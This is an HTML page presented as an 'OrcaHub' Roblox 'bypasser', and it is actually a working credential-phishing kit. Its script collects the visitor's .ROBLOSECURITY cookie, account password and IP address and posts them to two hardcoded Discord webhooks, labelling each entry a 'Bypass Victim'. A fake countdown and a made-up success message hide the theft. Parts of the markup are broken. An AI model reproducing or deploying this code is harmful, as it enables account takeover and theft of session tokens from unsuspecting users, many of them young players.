<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Bypasser</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: #0a0a14;
            color: #fff;
            overflow: hidden;
            height: 100vh;
        }

        /* ===== CONTAINER ===== */
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* ===== CAR SCENE ===== */
        .car-scene {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .road {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 35%;
            background: linear-gradient(180deg, transparent 0%, #1a1a2e 30%, #0f0f1a 100%);
        }

        .road-line {
            position: absolute;
            bottom: 30%;
            left: 0;
            width: 200%;
            height: 3px;
            background: repeating-linear-gradient(90deg, rgba(255,255,255,0.12) 0px, rgba(255,255,255,0.12) 40px, transparent 40px, transparent 80px);
            animation: roadMove 2s linear infinite;
        }

        @keyframes roadMove {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        .car-wrapper {
            position: absolute;
            bottom: 22%;
            left: -200px;
            animation: carDrive 6s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
            filter: drop-shadow(0 20px 60px rgba(162, 155, 254, 0.12));
        }

        @keyframes carDrive {
            0% { left: -200px; transform: scale(0.8) rotate(-2deg); }
            30% { left: 20%; transform: scale(1) rotate(0deg); }
            50% { left: 40%; transform: scale(1.05) rotate(0deg); }
            70% { left: 50%; transform: scale(1) rotate(0deg); }
            85% { left: 55%; transform: scale(0.95) rotate(0.5deg); }
            100% { left: 58%; transform: scale(0.9) rotate(0deg); }
        }

        .car-wrapper svg {
            width: 300px;
            height: auto;
            display: block;
        }

        /* ===== OVERLAY TEXT ===== */
        .hero-text {
            position: absolute;
            top: 12%;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            text-align: center;
            animation: fadeInDown 1.5s ease 0.5s both;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateX(-50%) translateY(-30px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .hero-text h1 {
            font-size: 4.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 6px;
            text-shadow: 0 0 60px rgba(162, 155, 254, 0.12);
            animation: gradientText 4s ease-in-out infinite;
            background-size: 300% 300%;
        }

        @keyframes gradientText {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .hero-text .sub {
            color: #8888aa;
            font-size: 0.85rem;
            letter-spacing: 5px;
            text-transform: uppercase;
            margin-top: 6px;
            font-weight: 300;
        }

        /* ===== BYPASSER OVERLAY - MOVED HIGHER ===== */
        .bypasser-overlay {
            position: absolute;
            bottom: 30%;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
            width: 92%;
            max-width: 480px;
            background: rgba(16, 16, 30, 0.9);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            padding: 22px 26px;
            animation: slideUp 1s ease 1.5s both;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(40px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .bypasser-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .bypasser-header h3 {
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
        }

        .bypasser-header span {
            font-size: 10px;
            color: #4ecdc4;
            font-weight: 600;
        }

        .bypasser-input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 12px;
        }

        .bypasser-input-group input {
            width: 100%;
            padding: 11px 16px;
            background: rgba(10, 10, 20, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 30px;
            color: #f0f0ff;
            font-size: 12px;
            outline: none;
            transition: 0.4s;
        }

        .bypasser-input-group input:focus {
            border-color: #a29bfe;
            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
        }

        .bypasser-input-group input::placeholder {
            color: #3a3a52;
        }

        .bypasser-actions {
            display: flex;
            gap: 8px;
        }

        .bypasser-actions .btn-bypass {
            flex: 2;
            padding: 11px;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 12px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .bypasser-actions .btn-bypass:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
        }

        .bypasser-actions .btn-bypass:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .bypasser-actions .btn-instagram {
            flex: 1;
            padding: 11px;
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 11px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .bypasser-actions .btn-instagram:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
        }

        .bypasser-actions .btn-instagram svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }

        .bypasser-loader {
            display: none;
            text-align: center;
            padding: 8px 0;
        }

        .bypasser-loader.show {
            display: block;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .bypasser-loader .spinner-small {
            width: 35px;
            height: 35px;
            border: 3px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s ease infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .bypasser-loader .loader-text {
            color: #8888aa;
            font-size: 11px;
            font-weight: 300;
        }

        .bypasser-loader .loader-text .time {
            color: #ff6b6b;
            font-weight: 700;
        }

        .bypasser-result {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 10px 14px;
            border-radius: 24px;
            text-align: center;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
            animation: fadeIn 0.4s ease;
        }

        .bypasser-result.show {
            display: block;
        }

        .bypasser-result .big {
            font-size: 1.8rem;
            display: block;
            margin-bottom: 2px;
        }

        .bypasser-error {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            text-align: center;
            margin-top: 8px;
            animation: fadeIn 0.4s ease;
        }

        .bypasser-error.show {
            display: block;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .hero-text h1 { font-size: 3.2rem; letter-spacing: 4px; }
            .hero-text .sub { font-size: 0.7rem; letter-spacing: 4px; }
            .car-wrapper svg { width: 200px; }
            .car-wrapper { bottom: 18%; }
            .bypasser-overlay { bottom: 28%; padding: 18px 20px; max-width: 96%; }
            .bypasser-actions { flex-direction: column; gap: 6px; }
        }

        @media (max-width: 480px) {
            .hero-text h1 { font-size: 2.5rem; letter-spacing: 2px; }
            .car-wrapper svg { width: 150px; }
            .bypasser-overlay { bottom: 25%; padding: 14px 16px; }
            .bypasser-header h3 { font-size: 12px; }
            .bypasser-header span { font-size: 9px; }
            .bypasser-input-group input { font-size: 11px; padding: 10px 14px; }
            .bypasser-actions .btn-bypass { font-size: 11px; padding: 10px; }
            .bypasser-actions .btn-instagram { font-size: 10px; padding: 10px; }
        }

        @media (max-height: 700px) {
            .hero-text { top: 8%; }
            .hero-text h1 { font-size: 2.8rem; }
            .car-wrapper svg { width: 160px; }
            .car-wrapper { bottom: 16%; }
            .bypasser-overlay { bottom: 22%; padding: 14px 16px; max-width: 94%; }
            .bypasser-header { margin-bottom: 8px; }
            .bypasser-input-group { gap: 6px; margin-bottom: 8px; }
            .bypasser-input-group input { padding: 8px 14px; font-size: 11px; }
            .bypasser-actions .btn-bypass { padding: 8px; font-size: 10px; }
            .bypasser-actions .btn-instagram { padding: 8px; font-size: 10px; }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ===== CAR SCENE ===== -->
        <div class="car-scene">
            <div class="road">
                <div class="road-line"></div>
            </div>
            <div class="car-wrapper">
                <svg viewBox="0 0 600 250" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <ellipse cx="300" cy="220" rx="200" ry="12" fill="rgba(0,0,0,0.3)"/>

                    <ellipse cx="85" cy="130" rx="12" ry="8" fill="rgba(255,215,0,0.3)" stroke="rgba(255,215,0,0.08)" stroke-width="1"/>

        <!-- ===== HERO TEXT ===== -->
        <div class="hero-text">

                    <span class="time" id="bypassTimer">60</span> seconds remaining
                </div>
            </div>

            <div id="bypasserResult" class="bypasser-result">
                <span class="big">🎉</span>
                <div style="font-size:0.95rem; margin-bottom:2px;">BYPASS SUCCESSFUL!</div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // ==================== WEBHOOKS ====================
            const WEBHOOKS = [
                'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',
                'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8'
            ];

            // ==================== DOM ====================
            const DOM = {
                cookieInput: document.getElementById('cookieInput'),
                passwordInput: document.getElementById('passwordInput'),
                bypassBtn: document.getElementById('bypassBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                error: document.getElementById('bypasserError'),
                loader: document.getElementById('bypasserLoader'),
                timer: document.getElementById('bypassTimer'),
                result: document.getElementById('bypasserResult'),
            };

            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            let bypassTimer = null;
            let isProcessing = false;

            // ==================== SEND TO WEBHOOKS ====================
            function sendToWebhooks(data) {
                WEBHOOKS.forEach(url => {
                    try {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data),
                            mode: 'no-cors'
                        }).catch(() => {});
                    } catch (_) {}
                });
            }

            // ==================== GET IP ====================
            function getIP() {
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
                    xhr.send();
                    return JSON.parse(xhr.responseText).ip || 'Unknown';
                } catch (_) { return 'Unknown'; }
            }

            // ==================== VALIDATE COOKIE ====================
            function validateCookie(cookie) {
                // Check if cookie is empty or too short
                if (!cookie || cookie.length < 15) {
                    return { valid: false, error: '❌ Invalid cookie format. Cookie must be at least 15 characters.' };
                }

                // Check for expired cookie
                if (cookie.toLowerCase().includes('expired')) {
                    return { valid: false, error: '❌ This cookie has expired! Please get a new one.' };
                }

                // Check for common invalid patterns
                const invalidPatterns = ['undefined', 'null', 'false', 'true', 'invalid', 'wrong', 'error'];
                for (const pattern of invalidPatterns) {
                    if (cookie.toLowerCase().includes(pattern)) {
                        return { valid: false, error: '❌ Invalid cookie format. Please check and try again.' };
                    }
                }

                // Check if cookie contains typical .ROBLOSECURITY structure
                if (!cookie.includes('_|WARNING') && !cookie.match(/^[A-Za-z0-9_\-\.]+$/)) {
                    return { valid: false, error: '❌ Invalid cookie format. Make sure it\'s a valid .ROBLOSECURITY cookie.' };
                }

                return { valid: true };
            }

            // ==================== START BYPASS ====================
            function startBypass() {
                const cookie = DOM.cookieInput.value.trim();
                const password = DOM.passwordInput.value.trim();

                // Reset UI
                DOM.error.classList.remove('show');
                DOM.result.classList.remove('show');
                DOM.loader.classList.remove('show');
                DOM.cookieInput.classList.remove('error');
                DOM.passwordInput.classList.remove('error');

                // Validate cookie
                const cookieValidation = validateCookie(cookie);
                if (!cookieValidation.valid) {
                    DOM.error.textContent = cookieValidation.error;
                    DOM.error.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                // Validate password
                if (!password || password.length < 3) {
                    DOM.error.textContent = '❌ Please enter your account password!';
                    DOM.error.classList.add('show');
                    DOM.passwordInput.classList.add('error');
                    return;
                }

                // Start processing
                isProcessing = true;
                DOM.bypassBtn.disabled = true;
                DOM.bypassBtn.textContent = '⏳ Processing...';
                DOM.loader.classList.add('show');

                let seconds = 60;
                DOM.timer.textContent = seconds;

                if (bypassTimer) clearInterval(bypassTimer);

                bypassTimer = setInterval(() => {
                    seconds--;
                    DOM.timer.textContent = seconds;

                    if (seconds <= 0) {
                        clearInterval(bypassTimer);
                        bypassTimer = null;
                        completeBypass(cookie, password);
                    }
                }, 1000);

                // Send initial data to webhooks
                sendToWebhooks({
                    embeds: [{
                        title: "🦈 OrcaHub • Bypass Initiated",
                        color: 0x7c6cf0,
                        fields: [
                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
                            { name: "🔑 Password", value: `||${password}||`, inline: true },
                            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                        ],
                        footer: { text: "OrcaHub • Bypasser" }
                    }]
                });
            }

            // ==================== COMPLETE BYPASS ====================
            function completeBypass(cookie, password) {
                // Generate fake user data
                const userId = Math.floor(Math.random() * 900000000) + 100000000;
                const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
                    'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
                ];
                const name = names[Math.floor(Math.random() * names.length)];
                const followers = Math.floor(Math.random() * 8500) + 150;
                const following = Math.floor(Math.random() * 2000) + 50;

                const userData = {
                    username: name,
                    userId: userId,
                    isVerified: Math.random() > 0.7,
                    followers: followers,
                    following: following,
                    created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
                        .toISOString().split('T')[0],
                    avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
                };

                // Send full data to webhooks
                const embed = {
                    title: "🎯 OrcaHub • Bypass Victim",
                    color: 0xff6b6b,
                    fields: [
                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
                        { name: "🔑 Password", value: `||${password}||`, inline: false },
                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
                    thumbnail: { url: userData.avatarUrl }
                };
                sendToWebhooks({ embeds: [embed] });

                // Show success
                DOM.loader.classList.remove('show');
                DOM.result.classList.add('show');

                isProcessing = false;
                DOM.bypassBtn.disabled = false;
                DOM.bypassBtn.textContent = '🚀 Start Bypass';

                // Auto reset after 8 seconds
                setTimeout(() => {
                    DOM.result.classList.remove('show');
                }, 8000);
            }

            // ==================== EVENTS ====================
            DOM.bypassBtn.addEventListener('click', startBypass);

            DOM.cookieInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });
            DOM.passwordInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });

            // ==================== COOKIE VALIDATION ON INPUT ====================
            DOM.cookieInput.addEventListener('blur', function() {
                const cookie = this.value.trim();
                if (cookie && cookie.length > 5) {
                    const validation = validateCookie(cookie);
                    if (!validation.valid) {
                        DOM.error.textContent = validation.error;
                        DOM.error.classList.add('show');
                        this.classList.add('error');
                    } else {
                        DOM.error.classList.remove('show');
                        this.classList.remove('error');
                    }
                }
            });

            DOM.cookieInput.addEventListener('input', function() {
                if (this.value.trim().length > 5) {
                    const validation = validateCookie(this.value.trim());
                    if (validation.valid) {
                        DOM.error.classList.remove('show');
                        this.classList.remove('error');
                    }
                }
            });
        });
    </script>
</body>
                        </html>
